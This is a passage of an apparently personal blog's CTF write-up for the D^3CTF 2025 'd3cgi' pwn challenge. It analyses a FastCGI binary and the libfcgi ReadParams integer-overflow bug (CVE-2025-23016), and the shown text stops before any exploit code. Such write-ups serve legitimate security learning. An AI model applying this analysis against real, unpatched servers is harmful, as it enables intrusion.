@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+            --font-size: 17.5px;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>D^3CTF 2025 | d3cgi</title>
+    <meta name="description" content="Overview A few days ago, I played D^3CTF 2025 to try out some medium and hard PWN challenges.
+This was the only challenge I managed to solve, and I believe it …">
+    <meta name="keywords" content='pwn, writeup, cgi'>
+
+    <meta property="og:url" content="https://example.org/posts/d3ctf-2025--d3cgi/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="D^3CTF 2025 | d3cgi">
+    <meta property="og:description" content="Overview A few days ago, I played D^3CTF 2025 to try out some medium and hard PWN challenges.
+This was the only challenge I managed to solve, and I believe it …">
+    <meta property="og:image" content="https://example.org/images/avatar.png">
+    <meta property="og:image:secure_url" content="https://example.org/images/avatar.png">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="D^3CTF 2025 | d3cgi">
+    <meta name="twitter:description" content="Overview A few days ago, I played D^3CTF 2025 to try out some medium and hard PWN challenges.
+This was the only challenge I managed to solve, and I believe it …">
+    <meta property="twitter:domain" content="https://example.org/posts/d3ctf-2025--d3cgi/">
+    <meta property="twitter:url" content="https://example.org/posts/d3ctf-2025--d3cgi/">
+    <meta name="twitter:image" content="https://example.org/images/avatar.png">
+
+    
+    <link rel="canonical" href="https://example.org/posts/d3ctf-2025--d3cgi/">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
+
+    
+    <script src="/js/bundle.min.70293498aa96b2dbb767ec11a622eb2266d8fc37a0fff88233a82952e3c72b15.js" integrity="sha256-cCk0mKqWstu3Z&#43;wRpiLrImbY/Deg//iCM6gpUuPHKxU="></script>
+
+    
+    
+</head>
+<body>
+        <script>
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://example.org/">
+                <img src='/images/avatar.png' alt="avatar">
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://example.org/">Manjaro</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://example.org/posts/" aria-label="" > Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://example.org/tags/" aria-label="" > Tags </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                <a aria-hidden="true" role="switch">
+                    <span class="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
+                <a aria-checked="false" aria-labelledby="hamburger-menu-toggle" id="hamburger-menu-toggle-target" role="switch">
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://example.org/posts/" > Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://example.org/tags/" > Tags </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                    <a role="switch">
+                        <span class="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>D^3CTF 2025 | d3cgi</h1>
+
+        
+
+        
+	
+	
+	
+	
+        
+
+	
+
+	
+
+	
+          <small role="doc-subtitle"></small>
+	
+
+	
+          <p class="post-date">
+              
+
+              June 2, 2025
+
+              
+                  | Updated June 2, 2025
+              
+          </p>
+	
+
+        <ul class="post-tags">
+          
+           
+             <li class="post-tag"><a href="https://example.org/tags/pwn">pwn</a></li>
+           
+         
+           
+             <li class="post-tag"><a href="https://example.org/tags/writeup">writeup</a></li>
+           
+         
+           
+             <li class="post-tag"><a href="https://example.org/tags/cgi">cgi</a></li>
+           
+         
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <h2 id="overview">Overview</h2>
+<p>A few days ago, I played <strong>D^3CTF 2025</strong> to try out some medium and hard PWN challenges.<br>
+This was the only challenge I managed to solve, and I believe it was the easiest one.<br>
+It was a fun challenge to solve and a valuable experience, as it involved a real-world vulnerability.</p>
+<p>The challenge comes with a <code>challenge</code> binary, a <code>lighttpd</code> binary, a <code>libs/</code> directory, <code>lighttpd.conf</code>, a <code>Dockerfile</code>,
+and some shell scripts to simplify setup in a Docker container.<br>
+The <code>challenge</code> binary is a CGI application served over the web using the Lighttpd web server.<br>
+Here&rsquo;s the checksec output for the <code>challenge</code> binary:</p>
+<pre tabindex="0"><code>    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8042000)
+    RUNPATH:    b&#39;./libs&#39;
+</code></pre><p>It’s a 32-bit binary with no PIE and partial RELRO, which is useful information as it opens up several exploitation possibilities.</p>
+<h3 id="binary-analysis">Binary analysis</h3>
+<p>I began reverse engineering the challenge binary, looking for vulnerabilities.<br>
+It turned out to be a very simple binary, the <code>main</code> function was primarily responsible for accepting and parsing requests.
+I renamed all functions as I saw fit, and in the following text, I’ll refer to them using the names I assigned.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#a6e22e">FCGX_Init</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FCGX_InitRequest</span>(<span style="color:#f92672">&amp;</span>request, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#a6e22e">FCGX_Accept_r</span>(<span style="color:#f92672">&amp;</span>request) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ParseRequest</span>(<span style="color:#f92672">&amp;</span>request);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FCGX_Finish_r</span>(<span style="color:#f92672">&amp;</span>request);
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>The <code>ParseRequest</code> function simply iterates over the handlers.<br>
+To make things clearer, I created a struct to represent a handler.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> Handler
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>route;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>handler)(FCGX_Request <span style="color:#f92672">*</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>methods[<span style="color:#ae81ff">8</span>];
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">ParseRequest</span>(FCGX_Request <span style="color:#f92672">*</span>req)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  Handler <span style="color:#f92672">*</span>i; <span style="color:#75715e">// [esp+0h] [ebp-18h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>j; <span style="color:#75715e">// [esp+4h] [ebp-14h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>route; <span style="color:#75715e">// [esp+8h] [ebp-10h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>method; <span style="color:#75715e">// [esp+Ch] [ebp-Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  route <span style="color:#f92672">=</span> <span style="color:#a6e22e">FCGX_GetParam</span>(<span style="color:#e6db74">&#34;SCRIPT_NAME&#34;</span>, req<span style="color:#f92672">-&gt;</span>envp);
+</span></span><span style="display:flex;"><span>  method <span style="color:#f92672">=</span> <span style="color:#a6e22e">FCGX_GetParam</span>(<span style="color:#e6db74">&#34;REQUEST_METHOD&#34;</span>, req<span style="color:#f92672">-&gt;</span>envp);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( route <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>route <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/&#39;</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> handlers; i<span style="color:#f92672">-&gt;</span>route; <span style="color:#f92672">++</span>i )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(route, i<span style="color:#f92672">-&gt;</span>route) )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ( j <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)i<span style="color:#f92672">-&gt;</span>methods; <span style="color:#f92672">*</span>j; <span style="color:#f92672">++</span>j )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(method, <span style="color:#f92672">*</span>j) )
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            i<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">handler</span>(req);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">err405</span>(req);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">err404</span>(req);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>There are three handlers, and they look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>handlers <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        route<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/&#34;</span>,
+</span></span><span style="display:flex;"><span>        handler<span style="color:#f92672">=</span>home
+</span></span><span style="display:flex;"><span>        methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;POST&#34;</span>]
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        route<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/index.html&#34;</span>,
+</span></span><span style="display:flex;"><span>        handler<span style="color:#f92672">=</span>home
+</span></span><span style="display:flex;"><span>        methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;POST&#34;</span>]
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        route<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/uptime&#34;</span>,
+</span></span><span style="display:flex;"><span>        handler<span style="color:#f92672">=</span>uptime
+</span></span><span style="display:flex;"><span>        methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>]
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>The <code>home</code> function simply prints &ldquo;HELLO!&rdquo;.<br>
+The interesting one is <code>uptime</code>, which calls the <code>execute</code> function to retrieve the system uptime.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">home</span>(FCGX_Request <span style="color:#f92672">*</span>req)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FCGX_FPrintF</span>(req<span style="color:#f92672">-&gt;</span>out, <span style="color:#e6db74">&#34;Content-type: text/html</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FCGX_FPrintF</span>(req<span style="color:#f92672">-&gt;</span>out, <span style="color:#e6db74">&#34;&lt;html&gt;&lt;body&gt;&lt;h1&gt;HELLO!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">uptime</span>(FCGX_Request <span style="color:#f92672">*</span>req)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ptr; <span style="color:#75715e">// [esp+Ch] [ebp-Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  ptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">execute</span>(<span style="color:#e6db74">&#34;/usr/bin/uptime&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FCGX_FPrintF</span>(req<span style="color:#f92672">-&gt;</span>out, <span style="color:#e6db74">&#34;Content-type: text/html</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( ptr )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FCGX_FPrintF</span>(req<span style="color:#f92672">-&gt;</span>out, <span style="color:#e6db74">&#34;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Uptime:&lt;/h1&gt;&lt;p&gt;%s&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&#34;</span>, ptr);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(ptr);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FCGX_FPrintF</span>(req<span style="color:#f92672">-&gt;</span>out, <span style="color:#e6db74">&#34;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Error fetching uptime&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>execute</code> doesn’t do much more than simply forking a child process
+and executing the provided command to get its output.
+But that is actually very useful because PIE is not enabled
+and because of that the <code>system</code> PLT address is known.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">execute</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>filename)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>result; <span style="color:#75715e">// eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _BYTE <span style="color:#f92672">*</span>buf; <span style="color:#75715e">// [esp+18h] [ebp-20h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  __pid_t pid; <span style="color:#75715e">// [esp+1Ch] [ebp-1Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> pipe_[<span style="color:#ae81ff">2</span>]; <span style="color:#75715e">// [esp+24h] [ebp-14h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> canary; <span style="color:#75715e">// [esp+2Ch] [ebp-Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  canary <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readgsdword</span>(<span style="color:#ae81ff">0x14u</span>);
+</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x1000u</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( buf )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">pipe</span>(pipe_) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      result <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">fork</span>();
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( pid <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>pid )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">dup2</span>(pipe_[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">close</span>(pipe_[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">close</span>(pipe_[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">system</span>(filename);
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(pipe_[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>        buf[<span style="color:#a6e22e">read</span>(pipe_[<span style="color:#ae81ff">0</span>], buf, <span style="color:#ae81ff">0xFFFu</span>)] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">wait</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> buf;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( canary <span style="color:#f92672">!=</span> <span style="color:#a6e22e">__readgsdword</span>(<span style="color:#ae81ff">0x14u</span>) )
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">stack_check_fail</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>I couldn’t find any vulnerable part in the code that would lead to RCE and solving the challenge.<br>
+Therefore, I changed my approach and began searching for known vulnerabilities in <code>libfcgi</code>.</p>
+<h3 id="finding-the-vulnerability">Finding the vulnerability</h3>
+<p>I started researching <code>libfcgi</code> and quickly came across <strong><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-23016">CVE-2025-23016</a></strong>,<br>
+a recent vulnerability discovered in the 32-bit version of <code>libfcgi</code>.</p>
+<p>The vulnerability is located in the <code>ReadParams</code> function, which takes an <code>FCGX_Stream*</code>
+parameter to read data from the socket and populates a pointer to a <code>Params</code> structure.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">ReadParams</span>(Params <span style="color:#f92672">*</span>paramsPtr, FCGX_Stream <span style="color:#f92672">*</span>stream)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> nameLen, valueLen;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> lenBuff[<span style="color:#ae81ff">3</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>nameValue;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>((nameLen <span style="color:#f92672">=</span> <span style="color:#a6e22e">FCGX_GetChar</span>(stream)) <span style="color:#f92672">!=</span> EOF) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * Read name length (one or four bytes) and value length
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * (one or four bytes) from stream.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>((nameLen <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x80</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">FCGX_GetStr</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) <span style="color:#f92672">&amp;</span>lenBuff[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">3</span>, stream) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">SetError</span>(stream, FCGX_PARAMS_ERROR);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            nameLen <span style="color:#f92672">=</span> ((nameLen <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7f</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">+</span> (lenBuff[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">+</span> (lenBuff[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> lenBuff[<span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>((valueLen <span style="color:#f92672">=</span> <span style="color:#a6e22e">FCGX_GetChar</span>(stream)) <span style="color:#f92672">==</span> EOF) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">SetError</span>(stream, FCGX_PARAMS_ERROR);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>((valueLen <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x80</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">FCGX_GetStr</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) <span style="color:#f92672">&amp;</span>lenBuff[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">3</span>, stream) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">SetError</span>(stream, FCGX_PARAMS_ERROR);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            valueLen <span style="color:#f92672">=</span> ((valueLen <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7f</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">+</span> (lenBuff[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">+</span> (lenBuff[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> lenBuff[<span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * nameLen and valueLen are now valid; read the name and value
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * from stream and construct a standard environment entry.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         */</span>
+</span></span><span style="display:flex;"><span>        nameValue <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">Malloc</span>(nameLen <span style="color:#f92672">+</span> valueLen <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">FCGX_GetStr</span>(nameValue, nameLen, stream) <span style="color:#f92672">!=</span> nameLen) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">SetError</span>(stream, FCGX_PARAMS_ERROR);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">free</span>(nameValue);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(nameValue <span style="color:#f92672">+</span> nameLen) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;=&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">FCGX_GetStr</span>(nameValue <span style="color:#f92672">+</span> nameLen <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, valueLen, stream)
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">!=</span> valueLen) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">SetError</span>(stream, FCGX_PARAMS_ERROR);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">free</span>(nameValue);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        }
